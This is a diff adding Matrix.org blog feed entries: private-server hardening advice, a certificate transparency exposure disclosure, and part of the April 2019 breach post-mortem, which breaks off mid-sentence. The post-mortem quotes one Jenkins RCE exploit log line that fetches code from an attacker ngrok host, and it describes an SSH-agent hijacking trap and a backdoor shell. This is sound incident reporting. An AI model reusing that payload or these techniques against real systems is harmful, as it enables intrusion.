@@ -236,6 +236,425 @@ Lorentz&lt;&#x2F;a&gt;. Thank you!&lt;&#x2F;p&gt;
 </content>
 	</entry>
 	<entry xml:lang="en">
+		<title>Avoiding unwelcome visitors on private Matrix servers</title>
+		<published>2019-11-09T00:00:00+00:00</published>
+		<updated>2019-11-09T00:00:00+00:00</updated>
+		<link rel="alternate" href="/blog/2019/11/09/avoiding-unwelcome-visitors-on-private-matrix-servers/" type="text/html"/>
+		<id>/blog/2019/11/09/avoiding-unwelcome-visitors-on-private-matrix-servers/</id>
+		<content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
+&lt;p&gt;Over the course of today we&#x27;ve been made aware of folks port-scanning the
+general internet to discover private Matrix servers, looking for publicly
+visible room directories, and then trying to join rooms listed in them.&lt;&#x2F;p&gt;
+&lt;p&gt;If you are running a Matrix server that is intended to be private, you must correctly
+configure your server to not expose its public room list to the general public -
+and also ensure that any sensitive rooms are invite-only (especially if the
+server is federated with the public Matrix network).&lt;&#x2F;p&gt;
+&lt;p&gt;In Synapse, this means ensuring that the following options are set correctly in
+your &lt;code&gt;homeserver.yaml&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot;&gt;&lt;code&gt;&lt;span&gt;# If set to &amp;#39;false&amp;#39;, requires authentication to access the server&amp;#39;s public rooms
+&lt;&#x2F;span&gt;&lt;span&gt;# directory through the client API. Defaults to &amp;#39;true&amp;#39;.
+&lt;&#x2F;span&gt;&lt;span&gt;#
+&lt;&#x2F;span&gt;&lt;span&gt;#allow_public_rooms_without_auth: false
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;# If set to &amp;#39;false&amp;#39;, forbids any other homeserver to fetch the server&amp;#39;s public
+&lt;&#x2F;span&gt;&lt;span&gt;# rooms directory via federation. Defaults to &amp;#39;true&amp;#39;.
+&lt;&#x2F;span&gt;&lt;span&gt;#
+&lt;&#x2F;span&gt;&lt;span&gt;#allow_public_rooms_over_federation: false
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;For private servers, you will almost certainly want to explicitly set these to
+&lt;code&gt;false&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;, meaning that the server&#x27;s &amp;quot;public&amp;quot; room directory is hidden from the
+general internet and wider Matrix network.&lt;&#x2F;p&gt;
+&lt;p&gt;You can test whether your room directory is visible to arbitrary Matrix clients
+on the general internet by viewing a URL like
+https:&#x2F;&#x2F;sandbox.modular.im&#x2F;_matrix&#x2F;client&#x2F;r0&#x2F;publicRooms (but for your server). 
+If it gives a &amp;quot;Missing access token&amp;quot; error, you are okay.&lt;&#x2F;p&gt;
+&lt;p&gt;You can test whether your room directory is visible to arbitrary Matrix servers
+on the general internet by loading Riot (or similar) on another server, and
+entering the target server&#x27;s domain name into the room directory&#x27;s server
+selection box.  If you can&#x27;t see any rooms, then are okay.&lt;&#x2F;p&gt;
+&lt;p&gt;Relatedly, &lt;strong&gt;please ensure that any sensitive rooms are set to be &amp;quot;invite only&amp;quot;
+and room history is not world visible&lt;&#x2F;strong&gt; - particularly if your server is
+federated, or if it has public registration enabled.  This stops random
+members of the public peeking into them (let alone joining them).&lt;&#x2F;p&gt;
+&lt;p&gt;Relying on security-by-obscurity is a very bad idea: all it takes is for someone
+to scan the whole internet for Matrix servers, and then trying to join (say)
+#finance on each discovered domain (either by signing up on that
+server or by trying to join over federation) to cause problems.&lt;&#x2F;p&gt;
+&lt;p&gt;Finally, if you don&#x27;t want the general public reading your room directory,
+please also remember to turn off public registration on your homeserver.
+Otherwise even with the changes above, if randoms can sign up on your server
+to view &amp;amp; join rooms then all bets are off.&lt;&#x2F;p&gt;
+&lt;p&gt;We&#x27;ll be rethinking the security model of room directories in future (e.g.
+whether to default them to being only visible to registered users on the local
+server, or whether to replace per-server directories with per-community
+directories with finer grained access control, etc) - but until this is sorted,
+please heed this advice.&lt;&#x2F;p&gt;
+&lt;p&gt;If you have concerns about randoms having managed to discover or join rooms
+which should have been private, please contact security@matrix.org.&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>Fun and games with certificate transparency logs</title>
+		<published>2019-11-06T00:00:00+00:00</published>
+		<updated>2019-11-06T00:00:00+00:00</updated>
+		<link rel="alternate" href="/blog/2019/11/06/fun-and-games-with-certificate-transparency-logs/" type="text/html"/>
+		<id>/blog/2019/11/06/fun-and-games-with-certificate-transparency-logs/</id>
+		<content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
+&lt;p&gt;This morning (06:11 UTC) it became apparent through mails to support@matrix.org that a security researcher was working through the TLS Certificate Transparency logs for &lt;code&gt;*.matrix.org&lt;&#x2F;code&gt;,&lt;code&gt;*.riot.im&lt;&#x2F;code&gt; and &lt;code&gt;*.modular.im&lt;&#x2F;code&gt; to identify and try to access non-public services run by New Vector (the company formed by the original Matrix team, which hosts &lt;code&gt;*.matrix.org&lt;&#x2F;code&gt; on behalf of the Matrix.org Foundation, and develops Riot and runs the https:&#x2F;&#x2F;modular.im hosting service).&lt;&#x2F;p&gt;
+&lt;p&gt;Certificate Transparency (CT) is a feature of the TLS ecosystem which lets you see which public certificates have been created and signed by given authorities - intended to help identify and mitigate against malicious certificates.  This means that the DNS name of any host with a dedicated public TLS certificate (i.e. not using a wildcard certificate) is visible to the general public.&lt;&#x2F;p&gt;
+&lt;p&gt;In practice, this revealed a handful of internal-facing services using dedicated public TLS certificates which were accessible to the general internet - some of which should have been locked to be accessible only from our internal network.&lt;&#x2F;p&gt;
+&lt;p&gt;Specifically:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;kibana.ap-southeast-1.k8s.i.modular.im&lt;&#x2F;code&gt; - a Kibana deployment for a new experimental Modular cluster which is being set up in SE Asia. The Kibana is in the middle of being deployed, and was exposed without authentication during deployment due to a firewall &amp;amp; config error.  However, &lt;strong&gt;it is not a production system and carries no production traffic or user data&lt;&#x2F;strong&gt; (it was just being used for experimentation for hypothetical geography-specific Modular deployments).  We firewalled this off at 07:53 UTC, and are doing analysis to confirm there was no further compromise, and will then rebuild the cluster (having fixed the firewall config error from repeating).&lt;&#x2F;li&gt;
+&lt;li&gt;AWX deployments used by our internal Modular platform, which were behind authentication but should not be exposed to the public net.&lt;&#x2F;li&gt;
+&lt;li&gt;Various semi-internal dev and testing services which should be IP-locked to our internal network (but are all locked behind authentication too).&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Additionally, certain historical Modular homeservers &amp;amp; Riots (from before we switched to using wildcard certs, or where we’ve created a custom LetsEncrypt certificate for the server) are named in the CT logs - thus leaking the server’s name (which is typically public anyway in that server’s matrix IDs if the server is federated).&lt;&#x2F;p&gt;
+&lt;p&gt;We’re working through the services whose names were exposed checking for any other issues, but other than the non-production SE Asia Kibana instance we are not aware of problems resulting from this activity.&lt;&#x2F;p&gt;
+&lt;p&gt;Meanwhile, we’ll be ensuring that semi-internal services are only exposed on our internal network in future, and that Modular server names are not exposed by CT logs where possible.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;TL;DR&lt;&#x2F;strong&gt;: You can list all the public non-wildcard TLS certs for a given domain by looking somewhere like https:&#x2F;&#x2F;crt.sh&#x2F;?q=%25.matrix.org.  This lets you find internal-sounding services to try to attack.  In practice no production services were compromised, and most of our internal services are correctly firewalled from the public internet.  However, we’re reviewing the IP locking for ones in the grey zone (and preventing the bug which caused an experimental Kibana to be exposed without auth).&lt;&#x2F;p&gt;
+&lt;p&gt;We’d like to thank Linda Lapinlampi for notifying us about this.  We’d also like to remind everyone that we operate a Security Disclosure Policy (SDP) and Hall of Fame at https:&#x2F;&#x2F;matrix.org&#x2F;security-disclosure-policy&#x2F; which is designed to protect innocent users from being hurt by security issues - everyone: please consider disclosing issues responsibly to us as per the SDP.&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>Post-mortem and remediations for Apr 11 security incident</title>
+		<published>2019-05-08T00:00:00+00:00</published>
+		<updated>2019-05-08T00:00:00+00:00</updated>
+		<link rel="alternate" href="/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/" type="text/html"/>
+		<id>/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/</id>
+		<content type="html">&lt;h3 id=&quot;table-of-contents&quot;&gt;Table of contents&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#introduction&quot;&gt;Introduction&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#history&quot;&gt;History&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#the-incident&quot;&gt;The Incident&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#the-defacement&quot;&gt;The Defacement&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#the-rebuild&quot;&gt;The Rebuild&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#remediations&quot;&gt;Remediations&lt;&#x2F;a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#ssh&quot;&gt;SSH&lt;&#x2F;a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#ssh-agent-forwarding-should-be-disabled&quot;&gt;SSH agent forwarding should be disabled.&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#ssh-should-not-be-exposed-to-the-general-internet&quot;&gt;SSH should not be exposed to the general internet&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#ssh-keys-should-give-minimal-access&quot;&gt;SSH keys should give minimal access&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#two-factor-authentication&quot;&gt;Two factor authentication&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys&quot;&gt;It should be made as hard as possible to add malicious SSH keys&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#changes-to-ssh-keys-should-be-carefully-monitored&quot;&gt;Changes to SSH keys should be carefully monitored&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#ssh-config-should-be-hardened-disabling-unnecessary-options&quot;&gt;SSH config should be hardened, disabling unnecessary options&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#network-architecture&quot;&gt;Network architecture&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#keeping-patched&quot;&gt;Keeping patched&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#intrusion-detection&quot;&gt;Intrusion detection&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#incident-management&quot;&gt;Incident management&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#configuration-management&quot;&gt;Configuration management&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#avoiding-temporary-measures-which-last-forever&quot;&gt;Avoiding temporary measures which last forever&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#secure-packaging&quot;&gt;Secure packaging&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#dev-and-ci-infrastructure&quot;&gt;Dev and CI infrastructure&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#log-minimisation-and-handling-personally-identifying-information-pii&quot;&gt;Log minimisation and handling Personally Identifying Information (PII)&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#conclusion&quot;&gt;Conclusion&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;&#x2F;h3&gt;
+&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
+&lt;p&gt;On April 11th we dealt with a major security incident impacting the infrastructure which runs the Matrix.org homeserver - specifically: removing an attacker who had gained superuser access to much of our production network.  We provided updates at the time as events unfolded on April 11 and 12 via &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&#x2F;status&#x2F;1116304867683905537&quot;&gt;Twitter&lt;&#x2F;a&gt; and our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;04&#x2F;11&#x2F;security-incident&#x2F;&quot;&gt;blog&lt;&#x2F;a&gt;, but in this post we’ll try to give a full analysis of what happened and, critically, what we have done to avoid this happening again in future.  Apologies that this has taken several weeks to put together: the time-consuming process of rebuilding after the breach has had to take priority, and we also wanted to get the key remediation work in place before writing up the post-mortem.&lt;&#x2F;p&gt;
+&lt;p&gt;Firstly, please understand that &lt;strong&gt;this incident was not due to issues in the Matrix protocol itself or the wider Matrix network&lt;&#x2F;strong&gt; - and indeed everyone who wasn’t on the Matrix.org server should have barely noticed.  If you see someone say “Matrix got hacked”, please politely but firmly explain to them that the servers which run the oldest and biggest instance got compromised via a Jenkins vulnerability and bad ops practices, but &lt;strong&gt;the protocol and network itself was not impacted&lt;&#x2F;strong&gt;.  This is not to say that the Matrix protocol itself is bug free - indeed we are still in the process of exiting beta (delayed by this incident), but &lt;strong&gt;this incident was not related to the protocol&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;Before we get stuck in, we would like to apologise unreservedly to everyone impacted by this whole incident.  Matrix is an altruistic open source project, and our mission is to try to make the world a better place by providing a secure decentralised communication protocol and network for the benefit of everyone; giving users total control back over how they communicate online.&lt;&#x2F;p&gt;
+&lt;p&gt;In this instance, our focus on trying to improve the protocol and network came at the expense of investing sysadmin time around the legacy Matrix.org homeserver and project infrastructure which we provide as a free public service to help bootstrap the Matrix ecosystem, and we paid the price.&lt;&#x2F;p&gt;
+&lt;p&gt;This post will hopefully illustrate that we have learnt our lessons from this incident and will not be repeating them - and indeed intend to come out of this episode stronger than you can possibly imagine :)&lt;&#x2F;p&gt;
+&lt;p&gt;Meanwhile, if you think that the world needs Matrix, &lt;strong&gt;please&lt;&#x2F;strong&gt; consider supporting us via &lt;a href=&quot;https:&#x2F;&#x2F;patreon.com&#x2F;matrixdotorg&quot;&gt;Patreon&lt;&#x2F;a&gt; or &lt;a href=&quot;http:&#x2F;&#x2F;liberapay.com&#x2F;matrixdotorg&quot;&gt;Liberapay&lt;&#x2F;a&gt;.  Not only will this make it easier for us to invest in our infrastructure in future, it also makes projects like &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;pantalaimon&quot;&gt;Pantalaimon&lt;&#x2F;a&gt; (E2EE compatibility for all Matrix clients&#x2F;bots) possible, which are effectively being financed entirely by donations.  The funding we raised in Jan 2018 is not going to last forever, and we are currently looking into new longer-term funding approaches - for which we need your support.&lt;&#x2F;p&gt;
+&lt;p&gt;Finally, if you happen across security issues in Matrix or matrix.org’s infrastructure, please please consider disclosing them responsibly to us as per our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;security-disclosure-policy&#x2F;&quot;&gt;Security Disclosure Policy&lt;&#x2F;a&gt;, in order to help us improve our security while protecting our users.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;history&quot;&gt;History&lt;&#x2F;h3&gt;
+&lt;p&gt;Firstly, some context about Matrix.org’s infrastructure.  The public Matrix.org homeserver and its associated services runs across roughly 30 hosts, spanning the actual homeserver, its DBs, load balancers, intranet services, website, bridges, bots, integrations, video conferencing, CI, etc.  We provide it as a free public service to the Matrix ecosystem to help bootstrap the network and make life easier for first-time users.&lt;&#x2F;p&gt;
+&lt;p&gt;The deployment which was compromised in this incident was mainly set up back in Aug 2017 when we vacated our previous datacenter at short notice, thanks to our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2017&#x2F;07&#x2F;07&#x2F;a-call-to-arms-supporting-matrix&#x2F;&quot;&gt;funding situation&lt;&#x2F;a&gt; at the time. Previously we had been piggybacking on the well-managed production datacenters of our previous employer, but during the exodus we needed to move as rapidly as possible, and so we span up a bunch of vanilla Debian boxes on &lt;a href=&quot;https:&#x2F;&#x2F;upcloud.com&quot;&gt;UpCloud&lt;&#x2F;a&gt;, and shifted over services as simply as we could.  We had no dedicated ops people on the project at that point, so this was a subset of the Synapse and Riot&#x2F;Web dev teams putting on ops hats to rapidly get set up, whilst also juggling the daily fun of keeping the ever-growing Matrix.org server running and trying to actually develop and improve Matrix itself.&lt;&#x2F;p&gt;
+&lt;p&gt;In practice, this meant that some corners were cut that we expected to be able to come back to and address once we had dedicated ops staff on the team.  For instance, we skipped setting up a VPN for accessing production in favour of simply SSHing into the servers over the internet.  We also went for the simplest possible config management system: checking all the configs for the services into a private git repo.  We also didn’t spend much time hardening the default Debian installations - for instance, the default image allows root access via SSH and allows SSH agent forwarding, and the config wasn’t tweaked.  This is particularly unfortunate, given our previous production OS (a customised Debian variant) had got all these things right - but the attitude was that because we’d got this right in the past, we’d be easily able to get it right in future once we fixed up the hosts with proper configuration management etc.&lt;&#x2F;p&gt;
+&lt;p&gt;Separately, we also made the controversial decision to maintain a public-facing Jenkins instance.  We did this deliberately, despite the risks associated with running a complicated publicly available service like Jenkins, but reasoned that as a FOSS project, it is imperative that we are transparent and that continuous integration results and artefacts are available and directly visible to all contributors - whether they are part of the core dev team or not.  So we put Jenkins on its own host, gave it some macOS build slaves, and resolved to keep an eye open for any security alerts which would require an upgrade.&lt;&#x2F;p&gt;
+&lt;p&gt;Lots of stuff then happened over the following months - we &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;01&#x2F;29&#x2F;status-partners-up-with-new-vector-fueling-decentralised-comms-and-the-matrix-ecosystem&#x2F;&quot;&gt;secured funding&lt;&#x2F;a&gt; in Jan 2018; the French Government began talking about &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;04&#x2F;26&#x2F;matrix-and-riot-confirmed-as-the-basis-for-frances-secure-instant-messenger-app&#x2F;&quot;&gt;switching to Matrix&lt;&#x2F;a&gt; around the same time; the pressure of getting Matrix (and Synapse and Riot) out of beta and to a stable 1.0 grew ever stronger; the challenge of handling the ever-increasing traffic on the Matrix.org server soaked up more and more time, and we started to see our first major security incidents (a major DDoS in March 2018, mitigated by shielding behind Cloudflare, and various attacks on the more beta bits of Matrix itself).&lt;&#x2F;p&gt;
+&lt;p&gt;Good news was that funding meant that in March 2018 we were able to hire a fulltime ops specialist!  By this point, however, we had two new critical projects in play to try to ensure long-term funding for the project via New Vector, the startup formed in 2017 to hire the core team. Firstly, to build out &lt;a href=&quot;https:&#x2F;&#x2F;modular.im&quot;&gt;Modular.im&lt;&#x2F;a&gt; as a commercial-grade Matrix SaaS provider, and secondly, to support France in rolling out their massive Matrix deployment as a flagship example how Matrix can be used.  And so, for better or worse, the brand new ops team was given a very clear mandate: to largely ignore the legacy datacenter infrastructure, and instead focus exclusively on building entirely new, pro-grade infrastructure for Modular.im and France, with the expectation of eventually migrating Matrix.org itself into Modular when ready (or just turning off the Matrix.org server entirely, once we have account portability).&lt;&#x2F;p&gt;
+&lt;p&gt;So we ended up with two production environments; the legacy Matrix.org infra, whose shortcomings continued to linger and fester off the radar, and separately all the new Modular.im hosts, which are almost entirely operationally isolated from the legacy datacenter; whose configuration is managed exclusively by Ansible, and have sensible SSH configs which disallow root login etc.  With 20:20 hindsight, the failure to prioritise hardening the legacy infrastructure is quite a good example of the &lt;a href=&quot;https:&#x2F;&#x2F;fastjetperformance.com&#x2F;podcasts&#x2F;how-i-almost-destroyed-a-50-million-war-plane-when-display-flying-goes-wrong-and-the-normalisation-of-deviance&#x2F;&quot;&gt;normalisation of deviance&lt;&#x2F;a&gt; - we had gotten too used to the bad practices; all our attention was going elsewhere; and so we simply failed to prioritise getting back to fix them.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;the-incident&quot;&gt;The Incident&lt;&#x2F;h3&gt;
+&lt;p&gt;The first evidence of things going wrong was a tweet from &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;JaikeySarraf&quot;&gt;JaikeySarraf&lt;&#x2F;a&gt;, a security researcher who kindly reached out via DM at the end of Apr 9th to warn us that our Jenkins was outdated after stumbling across it via Google.  In practice, our Jenkins was running version 2.117 with plugins which had been updated on an adhoc basis, and we had indeed missed the security advisory (partially because most of our CI pipelines had moved to TravisCI, CircleCI and Buildkite), and so on Apr 10th we updated the Jenkins and investigated to see if any vulnerabilities had been exploited.&lt;&#x2F;p&gt;
+&lt;p&gt;In this process, we spotted an unrecognised SSH key in &lt;code&gt;&#x2F;root&#x2F;.ssh&#x2F;authorized_keys2&lt;&#x2F;code&gt; on the Jenkins build server.  This was suspicious both due to the key not being in our key DB and the fact the key was stored in the obscure &lt;code&gt;authorized_keys2&lt;&#x2F;code&gt; file (a legacy location from back when OpenSSH transitioned from &lt;a href=&quot;https:&#x2F;&#x2F;searchsecurity.techtarget.com&#x2F;tip&#x2F;An-introduction-to-SSH2&quot;&gt;SSH1-&amp;gt;SSH2&lt;&#x2F;a&gt;).  Further inspection showed that 19 hosts in total had the same key present in the same place.&lt;&#x2F;p&gt;
+&lt;p&gt;At this point we started doing forensics to understand the scope of the attack and plan the response, as well as taking snapshots of the hosts to protect data in case the attacker realised we were aware and attempted to vandalise or cover their tracks.  Findings were:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;The attacker had first compromised Jenkins on March 13th via an RCE vulnerability (CVE-2019-1003000 - &lt;a href=&quot;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;46572&quot;&gt;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;46572&lt;&#x2F;a&gt;):&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;code&gt;matrix.org:443 151.34.xxx.xxx - - [13&#x2F;Mar&#x2F;2019:18:46:07 +0000] &amp;quot;GET &#x2F;jenkins&#x2F;securityRealm&#x2F;user&#x2F;admin&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition&#x2F;checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0A@GrabResolver(name=%27orange.tw%27,%20root=%27http:&#x2F;&#x2F;5f36xxxx.ngrok.io&#x2F;jenkins&#x2F;%27)%0A@Grab(group=%27tw.orange%27,%20module=%270x3a%27,%20version=%27000%27)%0Aimport%20Orange; HTTP&#x2F;1.1&amp;quot; 500 6083 &amp;quot;-&amp;quot; &amp;quot;Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:47.0) Gecko&#x2F;20100101 Firefox&#x2F;47.0&amp;quot;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;This allowed them to further compromise a Jenkins slave (Flywheel, an old Mac Pro used mainly for continuous integration testing of Riot&#x2F;iOS and Riot&#x2F;Android). The attacker put an SSH key on the box, which was unfortunately exposed to the internet via a high-numbered SSH port for ease of admin by remote users, and placed a trap which waited for any user to SSH into the jenkins user, which would then hijack any available forwarded SSH keys to try to add the attacker’s SSH key to root@ on as many other hosts as possible.&lt;&#x2F;li&gt;
+&lt;li&gt;On Apr 4th at 12:32 GMT, one of the Riot devops team members SSH’d into the Jenkins slave to perform some admin, forwarding their SSH key for convenience for accessing other boxes while doing so.  This triggered the trap, and resulted in the majority of the malicious keys being inserted to the remote hosts.&lt;&#x2F;li&gt;
+&lt;li&gt;From this point on, the attacker proceeded to explore the network, performing targeted exfiltration of data (e.g. our passbolt database, which is thankfully end-to-end encrypted via GPG) seemingly targeting credentials and data for use in onward exploits, and installing backdoors for later use (e.g. a setuid root shell at &lt;code&gt;&#x2F;usr&#x2F;share&#x2F;bsd-mail&#x2F;shroot&lt;&#x2F;code&gt;).&lt;&#x2F;li&gt;
+&lt;li&gt;The majority of access to the hosts occurred between Apr 4th and 6th.&lt;&#x2F;li&gt;
+&lt;li&gt;There was no evidence of large-scale data exfiltration, based on analysing network logs.&lt;&#x2F;li&gt;
+&lt;li&gt;There was no evidence of Modular.im hosts having been compromised.  (Modular’s provisioning system and DB did run on the old infrastructure, but it was not used to tamper with the modular instances themselves).&lt;&#x2F;li&gt;
+&lt;li&gt;There was no evidence of the identity server databases having been compromised.&lt;&#x2F;li&gt;
+&lt;li&gt;There was no evidence of tampering in our source code repositories.&lt;&#x2F;li&gt;
+&lt;li&gt;There was no evidence of tampering of our distributed software packages.&lt;&#x2F;li&gt;
+&lt;li&gt;Two more hosts were compromised on Apr 5th by similarly hijacking another developer SSH agent as the dev logged into a production server.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;By around 2am on Apr 11th we felt that we had sufficient visibility on the attacker’s behaviour to be able to do a first pass at evicting them by locking down SSH, removing their keys, and blocking as much network traffic as we could.&lt;&#x2F;p&gt;
+&lt;p&gt;We then started a full rebuild of the datacenter on the morning of Apr 11th, given that the only responsible course of action when an attacker has acquired root is to salt the earth and start over afresh. This meant rotating all secrets; isolating the old hosts entirely (including ones which appeared to not have been compromised, for safety), spinning up entirely new hosts, and redeploying everything from scratch with the fresh secrets.  The process was significantly slowed down by colliding with unplanned maintenance and provisioning issues in the datacenter provider and unexpected delays spent waiting to copy data volumes between datacenters, but by 1am on Apr 12th the core matrix.org server was back up, and we had enough of a website up to publish the initial &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;04&#x2F;11&#x2F;security-incident&#x2F;&quot;&gt;security incident blog post&lt;&#x2F;a&gt;. (This was actually static HTML, faked by editing the generated WordPress content from the old website. We opted not to transition any WordPress deployments to the new infra, in a bid to keep our attack surface as 